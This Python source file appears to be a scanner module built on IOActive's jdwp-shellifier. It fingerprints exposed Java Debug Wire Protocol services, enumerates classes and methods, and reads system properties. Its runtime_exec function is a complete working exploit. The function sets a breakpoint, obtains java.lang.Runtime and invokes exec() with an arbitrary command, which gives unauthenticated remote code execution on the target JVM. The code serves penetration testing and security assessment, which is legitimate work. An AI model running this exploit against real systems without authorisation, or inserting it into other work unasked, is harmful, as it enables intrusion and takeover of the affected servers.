import socket
import time
import subprocess
import traceback
import copy
import struct
from time import sleep
from utils.output import Output
from utils.db import DB
import dataclasses

refTypeTag_map = {
    1: "Class",
    2: "Interface",
    3: "Array",
}



# Code taken from: https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-shellifier.py

def jdwpscan_worker(target, actions, timeout):
    try:
        jdwp = JDWP(target['hostname'], int(target['port']), timeout)

        success = jdwp.connect()

        if not success:
            return


        version_dict = jdwp.get_version()

        # [{'description': b'Java Debug Wire Protocol (Reference Implementation) version 1.8\nJVM Debug Interface version 1.2\nJVM version 1.8.0_212 (OpenJDK 64-Bit Server VM, mixed mode, sharing)', 'jdwpMajor': 1, 'jdwpMinor': 8, 'vmVersion': b'1.8.0_212', 'vmName': b'OpenJDK 64-Bit Server VM'}]
        version = "%s (JVM version %s)" % (version_dict['vmName'].decode(), version_dict['vmVersion'].decode())

        Output.write({'target': jdwp.url(), 'message': 'JDWP service: %s' % version})
        DB.insert_port({
            'hostname': target['hostname'],
            'port': target['port'],
            'protocol': 'tcp',
            'service': 'jdwp',
            'version': version,
        })

        if 'classes' in actions:
            classes_raw = jdwp.all_classes()

            classes_output = "\n"

            for raw in classes_raw:
                signature = raw['signature'].decode()
                if signature.startswith('L'):
                    signature = signature[1:-1]
                else:
                    continue

                refType = refTypeTag_map[raw['refTypeTag']]
                status = raw['status']

                flags = []
                if status & 0x01:
                    flags.append("VERIFIED")
                if status & 0x02:
                    flags.append("PREPARED")
                if status & 0x04:
                    flags.append("INITIALIZED")
                if status & 0x08:
                    flags.append("ERROR")

                jdwp_class = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'url': jdwp.url(),
                    'signature': signature,
                    'refType': refType,
                    'status': flags,
                }

                classes_output += " "*30 + " - %s (%s) [%s]\n" % (jdwp_class['signature'].ljust(50), jdwp_class['refType'].ljust(10), ", ".join(jdwp_class['status']))

                # Get class methods, only for non-standard classes
                methods = None
                if not signature.startswith("java/") and not signature.startswith("sun/"):
                    methods = []
                    methods_raw = jdwp.get_methods(raw["refTypeId"])

                    modBits_map = {
                        0x0001: 'public',
                        0x0002: 'private',
                        0x0004: 'protected',
                        0x0008: 'static',
                        0x0010: 'final',
                        0x0020: 'synchronized',
                        0x0040: 'bridge',
                        0x0080: 'varargs',
                        0x0100: 'native',
                        0x0400: 'abstract',
                        0x0800: 'strict',
                        0x1000: 'synthetic',
                    }

                    for method_raw in methods_raw:
                        name = method_raw['name'].decode()
                        modBits = method_raw['modBits']
                        modBits_flags = [name for bit, name in modBits_map.items() if modBits & bit]
                        classes_output += " "*35 + " - %s [%s]\n" % (name.ljust(20), ", ".join(modBits_flags))

                        methods.append({
                            'name': name,
                            'modBits': modBits_flags,
                        })

                    jdwp_class['methods'] = methods


            Output.highlight({"target": jdwp.url(), "message": classes_output}) 

        if 'system_info' in actions:
            jdwp.all_classes()

            runtime_exec(jdwp, "system_info", actions['system_info']['break_on'])

        if 'exec' in actions:
            jdwp.all_classes()

            runtime_exec(jdwp, "command", actions['exec']['break_on'], command=actions['exec']['command'])


    except Exception as e:
        raise e


def runtime_exec(jdwp, action, break_on, command=None):
    # 1. get Runtime class reference
    runtimeClass = jdwp.get_class_by_name(b"Ljava/lang/Runtime;")
    if runtimeClass is None:
        Output.error({"target": jdwp.url(), "message": "[-] Cannot find class Runtime"})
        return False
    #print ("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])

    # 2. get getRuntime() meth reference
    jdwp.get_methods(runtimeClass["refTypeId"])
    getRuntimeMeth = jdwp.get_method_by_name(b"getRuntime")
    if getRuntimeMeth is None:
        Output.error({"target": jdwp.url(), "message": "[-] Cannot find method Runtime.getRuntime()"})
        return False
    #print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])

    def str2fqclass(s):
        i = s.rfind('.')
        if i == -1:
            return None, None

        method = s[i:][1:]
        classname = 'L' + s[:i].replace('.', '/') + ';'
        return classname, method

    break_on_class, break_on_method = str2fqclass(break_on)

    if break_on_class == None:
        Output.error({"target": jdwp.url(), "message": "[-] Wront --break-on argument"})
        return False


    # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name( break_on_class.encode() )
    if c is None:
        Output.error({"target": jdwp.url(), "message": "[-] Could not access class '%s', It is possible that this class is not used by application. Test with another one with option `--break-on`" % break_on})
        return False

    jdwp.get_methods( c["refTypeId"] )
    m = jdwp.get_method_by_name( break_on_method.encode()  )
    if m is None:
        Output.error({"target": jdwp.url(), "message": "[-] Could not access method '%s'" % break_on})
        return False

    loc = bytes([TYPE_CLASS])
    loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
    loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
    loc+= struct.pack(">II", 0, 0)
    data = [ (MODKIND_LOCATIONONLY, loc), ]
    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
    #print ("[+] Created break event id=%x" % rId)

    # 4. resume vm and wait for event
    jdwp.resumevm()

    Output.success({"target": jdwp.url(), "message": "[+] Waiting for an event on '%s'" % break_on})
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None:
            break

    rId, threadId, loc = ret
    Output.success({"target": jdwp.url(), "message": "[+] Received matching event from thread %#x" % threadId})

    jdwp.clear_event(EVENT_BREAKPOINT, rId)

    if action == "system_info":
        properties = {
          b"java.version": "Java Runtime Environment version",
          b"java.vendor": "Java Runtime Environment vendor",
          b"java.vendor.url": "Java vendor URL",
          b"java.home": "Java installation directory",
          b"java.vm.specification.version": "Java Virtual Machine specification version",
          b"java.vm.specification.vendor": "Java Virtual Machine specification vendor",
          b"java.vm.specification.name": "Java Virtual Machine specification name",
          b"java.vm.version": "Java Virtual Machine implementation version",
          b"java.vm.vendor": "Java Virtual Machine implementation vendor",
          b"java.vm.name": "Java Virtual Machine implementation name",
          b"java.specification.version": "Java Runtime Environment specification version",
          b"java.specification.vendor": "Java Runtime Environment specification vendor",
          b"java.specification.name": "Java Runtime Environment specification name",
          b"java.class.version": "Java class format version number",
          b"java.class.path": "Java class path",
          b"java.library.path": "List of paths to search when loading libraries",
          b"java.io.tmpdir": "Default temp file path",
          b"java.compiler": "Name of JIT compiler to use",
          b"java.ext.dirs": "Path of extension directory or directories",
          b"os.name": "Operating system name",
          b"os.arch": "Operating system architecture",
          b"os.version": "Operating system version",
          b"file.separator": "File separator",
          b"path.separator": "Path separator",
          b"user.name": "User's account name",
          b"user.home": "User's home directory",
          b"user.dir": "User's current working directory"
        }

        systemClass = jdwp.get_class_by_name(b"Ljava/lang/System;")
        if systemClass is None:
            Output.error({"target": jdwp.url(), "message": "[-] Cannot find class java.lang.System"})
            return False

        jdwp.get_methods(systemClass["refTypeId"])
        getPropertyMeth = jdwp.get_method_by_name(b"getProperty")
        if getPropertyMeth is None:
            Output.error({"target": jdwp.url(), "message": "[-] Cannot find method System.getProperty()"})
            return False

        output = "System info:\n"
        for propStr, propDesc in properties.items():
            propObjIds =  jdwp.createstring(propStr)
            if len(propObjIds) == 0:
                Output.error({"target": jdwp.url(), "message": "[-] Failed to allocate command"})
                return False
            propObjId = propObjIds[0]["objId"]

            data = [ bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, propObjId), ]
            buf = jdwp.invokestatic(systemClass["refTypeId"],
                                    threadId,
                                    getPropertyMeth["methodId"],
                                    *data)
            if buf[0] != TAG_STRING:
                #print ("[-] %s: Unexpected returned type: expecting String" % propStr)
                pass
            else:
                retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
                res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, retId))
                output += " "*30 + " - %s: %s\n" % (propDesc.ljust(60), res.decode())
                #print ("[+] Found %s '%s'" % (propDesc, res))
        Output.success({"target": jdwp.url(), "message": output})
        return True

    elif action == "command":
        runtimeClassId = runtimeClass["refTypeId"]
        getRuntimeMethId = getRuntimeMeth["methodId"]

        # 1. allocating string containing our command to exec()
        cmdObjIds = jdwp.createstring( command.encode() )
        if len(cmdObjIds) == 0:
            Output.error({"target": jdwp.url(), "message": "[-] Failed to allocate command"})
            return False
        cmdObjId = cmdObjIds[0]["objId"]
        #print ("[+] Command string object created id:%x" % cmdObjId)

        # 2. use context to get Runtime object
        buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
        if buf[0] != TAG_OBJECT:
            Output.error({"target": jdwp.url(), "message": "[-] Unexpected returned type: expecting Object"})
            return False
        rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])

        if rt is None:
            Output.error({"target": jdwp.url(), "message": "[-] Failed to invoke Runtime.getRuntime()"})
            return False
        #print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)

        # 3. find exec() method
        execMeth = jdwp.get_method_by_name(b"exec")
        if execMeth is None:
            Output.error({"target": jdwp.url(), "message": "[-] Cannot find method Runtime.exec()"})
            return False
        #print ("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])

        # 4. call exec() in this context with the alloc-ed string
        data = [ bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
        buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
        if buf[0] != TAG_OBJECT:
            Output.error({"target": jdwp.url(), "message": "[-] Unexpected returned type: expecting Object"})
            return False

        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
        #print ("[+] Runtime.exec() successful, retId=%x" % retId)
        Output.success({"target": jdwp.url(), "message": "[+] Runtime.exec() successful, retId=%x" % retId})
        return True




################################################################################
#
# JDWP protocol variables
#
HANDSHAKE                 = b"JDWP-Handshake"

REQUEST_PACKET_TYPE       = 0x00
REPLY_PACKET_TYPE         = 0x80

# Command signatures
VERSION_SIG               = (1, 1)
CLASSESBYSIGNATURE_SIG    = (1, 2)
ALLCLASSES_SIG            = (1, 3)
ALLTHREADS_SIG            = (1, 4)
IDSIZES_SIG               = (1, 7)
CREATESTRING_SIG          = (1, 11)
SUSPENDVM_SIG             = (1, 8)
RESUMEVM_SIG              = (1, 9)
SIGNATURE_SIG             = (2, 1)
FIELDS_SIG                = (2, 4)
METHODS_SIG               = (2, 5)
GETVALUES_SIG             = (2, 6)
CLASSOBJECT_SIG           = (2, 11)
INVOKESTATICMETHOD_SIG    = (3, 3)
REFERENCETYPE_SIG         = (9, 1)
INVOKEMETHOD_SIG          = (9, 6)
STRINGVALUE_SIG           = (10, 1)
THREADNAME_SIG            = (11, 1)
THREADSUSPEND_SIG         = (11, 2)
THREADRESUME_SIG          = (11, 3)
THREADSTATUS_SIG          = (11, 4)
EVENTSET_SIG              = (15, 1)
EVENTCLEAR_SIG            = (15, 2)
EVENTCLEARALL_SIG         = (15, 3)

# Other codes
MODKIND_COUNT             = 1
MODKIND_THREADONLY        = 2
MODKIND_CLASSMATCH        = 5
MODKIND_LOCATIONONLY      = 7
EVENT_BREAKPOINT          = 2
SUSPEND_EVENTTHREAD       = 1
SUSPEND_ALL               = 2
NOT_IMPLEMENTED           = 99
VM_DEAD                   = 112
INVOKE_SINGLE_THREADED    = 2
TAG_OBJECT                = 76
TAG_STRING                = 115
TYPE_CLASS                = 1


class JDWP:

    def __init__(self, host, port, timeout):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket = None
        self.id = 0x01
        self.methods = {}

    def url(self):
        return "jdwp://%s:%d" % (self.host, self.port)

    def connect(self):
        s = socket.socket()
        s.settimeout(self.timeout)
        try:
            s.connect( (self.host, self.port) )
        except socket.error as msg:
            return False

        s.send( HANDSHAKE )

        if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
            return False
        else:
            self.socket = s

        self.idsizes()

        return True

    def idsizes(self):
        self.socket.sendall( self.create_packet(IDSIZES_SIG) )
        buf = self.read_reply()
        formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                    ("I", "referenceTypeIDSize"), ("I", "frameIDSize") ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.items():
                setattr(self, name, value)
        return

    def get_version(self):
        self.socket.sendall( self.create_packet(VERSION_SIG) )
        buf = self.read_reply()
        formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                    ('S', "vmVersion"), ('S', "vmName"), ]
        entry = self.parse_entries(buf, formats, False)
        return entry[0] 

    def all_classes(self):
        try:
            getattr(self, "classes")
        except:
            self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
            buf = self.read_reply()
            formats = [ ('C', "refTypeTag"),
                        (self.referenceTypeIDSize, "refTypeId"),
                        ('S', "signature"),
                        ('I', "status")]
            self.classes = self.parse_entries(buf, formats)

        return self.classes

    def get_class_by_name(self, name):
        for entry in self.classes:
            if entry["signature"].lower() == name.lower() :
                return entry
        return None

    def get_methods(self, refTypeId):
        if not refTypeId in self.methods:
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall( self.create_packet(METHODS_SIG, data=refId) )
            buf = self.read_reply()
            formats = [ (self.methodIDSize, "methodId"),
                        ('S', "name"),
                        ('S', "signature"),
                        ('I', "modBits")]
            self.methods[refTypeId] = self.parse_entries(buf, formats)
        return self.methods[refTypeId]

    def get_method_by_name(self, name):
        for refId in self.methods.keys():
            for entry in self.methods[refId]:
                if entry["name"].lower() == name.lower() :
                    return entry
        return None

    def format(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == "I" or fmt == 4:
            return struct.pack(">I", value)

        raise Exception("Unknown format")

    def unformat(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.unpack(">Q", value[:8])[0]
        elif fmt == "I" or fmt == 4:
            return struct.unpack(">I", value[:4])[0]
        else:
            raise Exception("Unknown format")
        return

    def createstring(self, data):
        buf = self.buildstring(data)
        self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
        buf = self.read_reply()
        return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)

    def buildstring(self, data):
        return struct.pack(">I", len(data)) + data

    def query_thread(self, threadId, kind):
        data = self.format(self.objectIDSize, threadId)
        self.socket.sendall( self.create_packet(kind, data=data) )
        buf = self.read_reply()
        return

    def close(self):
        self.socket.close()
        return

    def send_event(self, eventCode, *args):
        data = b""
        data+= bytes([ eventCode ])
        data+= bytes([ SUSPEND_ALL ])
        data+= struct.pack(">I", len(args))

        for kind, option in args:
            data+= bytes([ kind ])
            data+= option

        self.socket.sendall( self.create_packet(EVENTSET_SIG, data=data) )
        buf = self.read_reply()
        return struct.unpack(">I", buf)[0]

    def invokestatic(self, classId, threadId, methId, *args):
        data = self.format(self.referenceTypeIDSize, classId)
        data+= self.format(self.objectIDSize, threadId)
        data+= self.format(self.methodIDSize, methId)
        data+= struct.pack(">I", len(args))
        for arg in args:
            data+= arg
        data+= struct.pack(">I", 0)

        self.socket.sendall( self.create_packet(INVOKESTATICMETHOD_SIG, data=data) )
        buf = self.read_reply()
        return buf


    def wait_for_event(self):
        buf = self.read_reply()
        return buf

    def suspendvm(self):
        self.socket.sendall( self.create_packet( SUSPENDVM_SIG ) )
        self.read_reply()
        return

    def resumevm(self):
        self.socket.sendall( self.create_packet( RESUMEVM_SIG ) )
        self.read_reply()
        return

    def suspend_thread(self, threadId):
        return self.query_thread(threadId, THREADSUSPEND_SIG)

    def status_thread(self, threadId):
        return self.query_thread(threadId, THREADSTATUS_SIG)

    def resume_thread(self, threadId):
        return self.query_thread(threadId, THREADRESUME_SIG)


    def clear_event(self, eventCode, rId):
        data = bytes([eventCode])
        data+= struct.pack(">I", rId)
        self.socket.sendall( self.create_packet(EVENTCLEAR_SIG, data=data) )
        self.read_reply()
        return

    def clear_events(self):
        self.socket.sendall( self.create_packet(EVENTCLEARALL_SIG) )
        self.read_reply()
        return

    def create_packet(self, cmdsig, data=b""):
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        #pkt = struct.pack(">IIccc", pktlen, self.id, chr(flags), chr(cmdset), chr(cmd))
        pkt = struct.pack(">IIccc", pktlen, self.id, bytes([flags]), bytes([cmdset]), bytes([cmd]))
        pkt+= data
        self.id += 2
        return pkt

    def read_reply(self):
        header = self.socket.recv(11)
        pktlen, id, flags, errcode = struct.unpack(">IIcH", header)

        if flags == chr(REPLY_PACKET_TYPE):
            if errcode :
                raise Exception("Received errcode %d" % errcode)

        buf = b""
        while len(buf) + 11 < pktlen:
            data = self.socket.recv(1024)
            if len(data):
                buf += data
            else:
                time.sleep(1)
        return buf

    def invoke(self, objId, threadId, classId, methId, *args):
        data = self.format(self.objectIDSize, objId)
        data+= self.format(self.objectIDSize, threadId)
        data+= self.format(self.referenceTypeIDSize, classId)
        data+= self.format(self.methodIDSize, methId)
        data+= struct.pack(">I", len(args))
        for arg in args:
            data+= arg
        data+= struct.pack(">I", 0)

        self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) )
        buf = self.read_reply()
        return buf

    def parse_event_breakpoint(self, buf, eventId):
        num = struct.unpack(">I", buf[2:6])[0]
        rId = struct.unpack(">I", buf[6:10])[0]
        if rId != eventId:
            return None
        tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize])
        loc = -1 # don't care
        return rId, tId, loc

    def solve_string(self, objId):
        self.socket.sendall( self.create_packet(STRINGVALUE_SIG, data=objId) )
        buf = self.read_reply()
        if len(buf):
            return self.readstring(buf)
        else:
            return ""

    def readstring(self, data):
        size = struct.unpack(">I", data[:4])[0]
        return data[4:4+size]

    def parse_entries(self, buf, formats, explicit=True):
        entries = []
        index = 0


        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1

        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    data[name] = int(struct.unpack(">Q",buf[index:index+8]) [0])
                    index += 8
                elif fmt == "I" or fmt == 4:
                    data[name] = int(struct.unpack(">I", buf[index:index+4])[0])
                    index += 4
                elif fmt == 'S':
                    l = struct.unpack(">I", buf[index:index+4])[0]
                    data[name] = buf[index+4:index+4+l]
                    index += 4+l
                elif fmt == 'C':
                    #data[name] = ord(struct.unpack(">c", buf[index])[0])
                    data[name] = buf[index]
                    index += 1
                elif fmt == 'Z':
                    t = ord(struct.unpack(">c", buf[index])[0])
                    if t == 115:
                        s = self.solve_string(buf[index+1:index+9])
                        data[name] = s
                        index+=9
                    elif t == 73:
                        data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                        buf = struct.unpack(">I", buf[index+5:index+9])
                        index=0

                else:
                    print("Error")
                    return None

            entries.append( data )

        return entries

